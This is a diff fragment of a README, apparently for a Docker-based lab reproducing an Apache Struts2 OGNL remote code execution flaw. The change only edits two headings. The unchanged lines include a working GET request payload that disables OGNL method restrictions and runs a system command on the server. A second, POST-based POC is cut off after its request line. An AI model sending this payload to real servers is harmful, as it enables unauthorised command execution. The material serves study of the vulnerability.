@@ -38,7 +38,7 @@ docker-compose up -d
 
 ## POC && EXP
 
-### Remote code execution POC (don't have display echo, use `@` instead space):
+### Remote code execution POC (don't have display echo, use `@` instead space)
 
 ```
 GET /example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 HTTP/1.1
@@ -57,7 +57,7 @@ This POC don't have display, used OGNL's Expression Evaluation:
 
 However, how to understand exactly, it needs further research and to be optimized. Hope someone can write a POC that can display echo.
 
-### Remote code execution POC (have display echo, command need urlencode):
+### Remote code execution POC (have display echo, command need urlencode)
 
 ```
 POST /example/HelloWorld.action HTTP/1.1
